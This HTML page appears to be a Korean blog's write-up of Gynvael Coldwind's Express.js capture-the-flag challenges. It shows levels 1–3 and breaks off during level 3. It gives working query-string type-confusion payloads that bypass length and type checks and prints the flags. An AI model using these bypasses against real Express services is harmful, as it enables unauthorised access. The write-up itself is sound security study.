@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="트위터에서 Gynvael Coldwind라는 분이 만든 Express Challenge 입니다.  Challenge 112345678910111213141516171819202122232425262728293031323334353637Level 1const express &#x3D; require(&amp;#x27;express&amp;#x27;)const fs &#x3D; require">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Express Challenge Write Up (Gynvael Coldwind)">
+<meta property="og:url" content="http://example.com/2021/01/24/2021-01-24-express-challenge/index.html">
+<meta property="og:site_name" content="Home">
+<meta property="og:description" content="트위터에서 Gynvael Coldwind라는 분이 만든 Express Challenge 입니다.  Challenge 112345678910111213141516171819202122232425262728293031323334353637Level 1const express &#x3D; require(&amp;#x27;express&amp;#x27;)const fs &#x3D; require">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/wjddnjs33/image2/blob/main/aa.png?raw=true">
+<meta property="article:published_time" content="2021-01-24T00:00:00.000Z">
+<meta property="article:modified_time" content="2021-01-28T07:03:47.561Z">
+<meta property="article:author" content="Jeongwon Jo">
+<meta property="article:tag" content="Express.js">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/wjddnjs33/image2/blob/main/aa.png?raw=true">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Express Challenge Write Up (Gynvael Coldwind)</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2021/01/25/2021-01-25-CVE-2021-3129/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/01/24/2021-01-24-express-challenge/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/01/24/2021-01-24-express-challenge/&text=Express Challenge Write Up (Gynvael Coldwind)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/01/24/2021-01-24-express-challenge/&title=Express Challenge Write Up (Gynvael Coldwind)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/01/24/2021-01-24-express-challenge/&is_video=false&description=Express Challenge Write Up (Gynvael Coldwind)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Express Challenge Write Up (Gynvael Coldwind)&body=Check out this article: http://example.com/2021/01/24/2021-01-24-express-challenge/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/01/24/2021-01-24-express-challenge/&title=Express Challenge Write Up (Gynvael Coldwind)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/01/24/2021-01-24-express-challenge/&title=Express Challenge Write Up (Gynvael Coldwind)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/01/24/2021-01-24-express-challenge/&title=Express Challenge Write Up (Gynvael Coldwind)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/01/24/2021-01-24-express-challenge/&title=Express Challenge Write Up (Gynvael Coldwind)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/01/24/2021-01-24-express-challenge/&name=Express Challenge Write Up (Gynvael Coldwind)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/01/24/2021-01-24-express-challenge/&t=Express Challenge Write Up (Gynvael Coldwind)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-1"><span class="toc-number">1.</span> <span class="toc-text">Challenge 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-2"><span class="toc-number">2.</span> <span class="toc-text">Challenge 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-3"><span class="toc-number">3.</span> <span class="toc-text">Challenge 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-4"><span class="toc-number">4.</span> <span class="toc-text">Challenge 4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-5"><span class="toc-number">5.</span> <span class="toc-text">Challenge 5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-6"><span class="toc-number">6.</span> <span class="toc-text">Challenge 6</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Express Challenge Write Up (Gynvael Coldwind)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Jeongwon Jo</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-01-24T00:00:00.000Z" itemprop="datePublished">2021-01-24</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Express-js-Challenge/">Express.js Challenge</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Express-js/" rel="tag">Express.js</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p><strong>트위터에서 Gynvael Coldwind라는 분이 만든 Express Challenge 입니다.</strong><br></p>
+<hr>
+<h3 id="Challenge-1"><a href="#Challenge-1" class="headerlink" title="Challenge 1"></a>Challenge 1</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Level <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">5001</span></span><br><span class="line"><span class="keyword">const</span> FLAG = process.env.FLAG || <span class="string">&quot;???&quot;</span></span><br><span class="line"><span class="keyword">const</span> SOURCE = fs.readFileSync(<span class="string">&#x27;app.js&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.statusCode = <span class="number">200</span></span><br><span class="line">  res.setHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain;charset=utf-8&#x27;</span>)</span><br><span class="line">  res.write(<span class="string">&quot;Level 1\n\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(<span class="string">&#x27;secret&#x27;</span> <span class="keyword">in</span> req.query)) &#123;</span><br><span class="line">    res.end(SOURCE)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (req.query.secret.length &gt; <span class="number">5</span>) &#123;</span><br><span class="line">    res.end(<span class="string">&quot;I don&#x27;t allow it.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (req.query.secret != <span class="string">&quot;GIVEmeTHEflagNOW&quot;</span>) &#123;</span><br><span class="line">    res.end(<span class="string">&quot;Wrong secret.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  res.end(FLAG)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(PORT, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Example app listening at port <span class="subst">$&#123;PORT&#125;</span>`</span>)</span><br><span class="line">&#125;) </span><br></pre></td></tr></table></figure>
+<p><strong>Challenge 1의 솔브 조건을 확인해보면 Query String인 secret의 길이가 5 이상이면 안 되고, secret의 값이 <code>GIVEmeTHEflagNOW</code>여야 합니다. 하지만 해당 값은 길이가 16 이므로 5 이상이기 때문에 중간에 끊기게 됩니다.</strong><br></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">＞ <span class="keyword">var</span> secret = [<span class="string">&#x27;GIVEmeTHEflagNOW&#x27;</span>];</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">＞ secret.length</span><br><span class="line"><span class="number">1</span></span><br><span class="line">＞ <span class="keyword">if</span> (secret == <span class="string">&#x27;GIVEmeTHEflagNOW&#x27;</span>)&#123;<span class="built_in">console</span>.log(<span class="number">1</span>);&#125;</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><strong> 하지만 Express.js는 Object로 Query String을 보내줄 수 있기 때문에 이를 이용해서 보내주면 길이는 1, secret의 값은 <code>GIVEmeTHEflagNOW</code>가 되므로 문제를 해결할 수 있습니다.</strong><br></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solve Payload : http:&#x2F;&#x2F;challenges.gynvael.stream:5001&#x2F;?secret[]&#x3D;GIVEmeTHEflagNOW</span><br></pre></td></tr></table></figure>
+<p><code>FLAG : CTF&#123;SmellsLikePHP&#125;</code></p>
+<hr>
+<h3 id="Challenge-2"><a href="#Challenge-2" class="headerlink" title="Challenge 2"></a>Challenge 2</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">Level <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">5002</span></span><br><span class="line"><span class="keyword">const</span> FLAG = process.env.FLAG || <span class="string">&quot;???&quot;</span></span><br><span class="line"><span class="keyword">const</span> SOURCE = fs.readFileSync(<span class="string">&#x27;app.js&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.statusCode = <span class="number">200</span></span><br><span class="line">  res.setHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain;charset=utf-8&#x27;</span>)</span><br><span class="line">  res.write(<span class="string">&quot;Level 2\n\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(<span class="string">&#x27;X&#x27;</span> <span class="keyword">in</span> req.query)) &#123;</span><br><span class="line">    res.end(SOURCE)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (req.query.X.length &gt; <span class="number">800</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> s = <span class="built_in">JSON</span>.stringify(req.query.X)</span><br><span class="line">    <span class="keyword">if</span> (s.length &gt; <span class="number">100</span>) &#123;</span><br><span class="line">      res.end(<span class="string">&quot;Go away.&quot;</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> k = <span class="string">&#x27;&lt;&#x27;</span> + req.query.X + <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">      res.end(<span class="string">&quot;Close, but no cigar.&quot;</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">      res.end(FLAG)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.end(<span class="string">&quot;No way.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(PORT, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Challenge listening at port <span class="subst">$&#123;PORT&#125;</span>`</span>)</span><br><span class="line">&#125;) </span><br></pre></td></tr></table></figure>
+<p><strong><code>req.query.X</code>의 길이는 800보다 커야 하고, <code>JSON.stringify(req.query.X)</code>의 값은 100보다 작아야 합니다. </strong><br></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bypass Payload: http:&#x2F;&#x2F;challenges.gynvael.stream:5002&#x2F;?X[length]&#x3D;801</span><br></pre></td></tr></table></figure>
+<p><strong>Express.js는 Object로 값을 보내줄 수 있다는 것을 알고 있습니다. 위 조건문은 위 Payload를 이용해서 쉽게 우회할 수 있습니다. </strong><br></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (req.query.X.length &gt; <span class="number">800</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> s = <span class="built_in">JSON</span>.stringify(req.query.X)</span><br><span class="line">  <span class="keyword">if</span> (s.length &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    res.end(<span class="string">&quot;Go away.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p><strong><code>req.query.X.length</code>를 참조하면 801, <code>JSON.stringify()</code> 메서드를 이용해서 Query String을 문자열로 만들게 되면 길이가 길어봐야 35정도(최종 페이로드 기준) 될 것이기 때문에 쉽게 우회할 수 있습니다.</strong><br></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> k = <span class="string">&#x27;&lt;&#x27;</span> + req.query.X + <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">  res.end(<span class="string">&quot;Close, but no cigar.&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">  res.end(FLAG)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>try/catch 문을 보면 catch 문에서 flag를 출력해주는 것을 볼 수 있습니다. catch 문으로 가기 위해서는 try 문에서 에러를 내뱉게 해야 합니다. <code>const k = &#39;&lt;&#39; + req.query.X + &#39;&gt;&#39;</code>를 보면 문자열과 오브젝트 값을 더해주는 것을 볼 수 있습니다.</strong><br></p>
+<p><strong>Object와 문자열을 더해주면 오브젝트 값을 암시적으로 문자열로 변환해주는 메서드를 호출한다고 합니다. Javascript에서는 문자열로 변환해주는 메서드는 toString() 입니다.</strong><br></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">＞ <span class="keyword">var</span> a = &#123;<span class="attr">toString</span>:<span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">＞ secret.length</span><br><span class="line"><span class="number">1</span></span><br><span class="line">＞ <span class="keyword">const</span> s = <span class="string">&#x27;&lt;&#x27;</span> + a + <span class="string">&#x27;&gt;&#x27;</span>;</span><br><span class="line">ⓧ ▶Uncaught <span class="built_in">TypeError</span>: Cannot convert object to primitive value</span><br><span class="line">      at &lt;anonymous&gt;:<span class="number">1</span>:<span class="number">15</span></span><br></pre></td></tr></table></figure>
+<p><strong>Object 값으로 toString으로 보내줬습니다. 그 다음 <code>const s = &#39;&lt;&#39; + a + &#39;&gt;&#39;;</code>에서는 a 의 값이 Object이기 때문에 toString를 호출하게 됩니다. 이때 toString을 <code>a.toString</code> 이렇게 호출하게 되는데 a의 toString 값은 위에 보면 ‘’로 재정의  때문에 Object를 문자열로 변환해주지 못 해 에러가 발생하게 됩니다.</strong><br></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solve Payload : http:&#x2F;&#x2F;challenges.gynvael.stream:5002&#x2F;?X[length]&#x3D;801&amp;X[toString]</span><br></pre></td></tr></table></figure>
+<p><code>FLAG : CTF&#123;WaaayBeyondPHPLikeWTF&#125;</code></p>
+<hr>
+<h3 id="Challenge-3"><a href="#Challenge-3" class="headerlink" title="Challenge 3"></a>Challenge 3</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Level <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// IMPORTANT <span class="doctag">NOTE:</span></span></span><br><span class="line"><span class="comment">// The secret flag you need to find is in the path name of this JavaScript file.</span></span><br><span class="line"><span class="comment">// So yes, to solve the task, you just need to find out what&#x27;s the path name of</span></span><br><span class="line"><span class="comment">// this node.js/express script on the filesystem and that&#x27;s it.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">5003</span></span><br><span class="line"><span class="keyword">const</span> FLAG = process.env.FLAG || <span class="string">&quot;???&quot;</span></span><br><span class="line"><span class="keyword">const</span> SOURCE = fs.readFileSync(path.basename(__filename))</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.statusCode = <span class="number">200</span></span><br><span class="line">  res.setHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain;charset=utf-8&#x27;</span>)</span><br><span class="line">  res.write(<span class="string">&quot;Level 3\n\n&quot;</span>)</span><br><span class="line">  res.end(SOURCE)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/truecolors/:color&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.statusCode = <span class="number">200</span></span><br><span class="line">  res.setHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain;charset=utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> color = (<span class="string">&#x27;color&#x27;</span> <span class="keyword">in</span> req.params) ? req.params.color : <span class="string">&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (color === <span class="string">&#x27;red&#x27;</span> || color === <span class="string">&#x27;green&#x27;</span> || color === <span class="string">&#x27;blue&#x27;</span>) &#123;</span><br><span class="line">    res.end(<span class="string">&#x27;Yes! A true color!&#x27;</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.end(<span class="string">&#x27;Hmm? No.&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(PORT, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Challenge listening at port <span class="subst">$&#123;PORT&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p><strong>위쪽에 디스크립션을 보면 flag는 javascript 파일이 위치한 경로 파일 이름으로 되어 있다고 합니다. 하지만 코드를 보면 알겠지만 Path Traversal 취약점이 발생할 만한 곳은 존재하지 않습니다.</strong><br></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TypeError: Cannot convert object to primitive value</span><br><span class="line">    at &#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;app.js:9:19</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at next (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:137:13)</span><br><span class="line">    at Route.dispatch (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:112:3)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at &#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:281:22</span><br><span class="line">    at Function.process_params (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12)</span><br><span class="line">    at next (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:275:10)</span><br><span class="line">    at expressInit (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;middleware&#x2F;init.js:40:5)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br></pre></td></tr></table></figure>
+<p><strong>하지만 위에러를 보면 에러가 발생한 위치를 절대 경로로 알려주고 있는 것을 볼 수 있습니다. 그러니 해당 문제에서도 에러를 내뱉게만 하면 어디에서 에러가 났는 지 절대 경로로 보여줄 건데, 그때 경로에서 flag를 찾을 수 있을 것 입니다. (위 에러는 문제와 상관 없음)</strong><br></p>
+<p><strong>이렇게 시나리오는 구성했지만 에러를 어디서 내뱉게 해야 할 지 몰라 삽질을 조금 많이 했습니다.</strong><br></p>
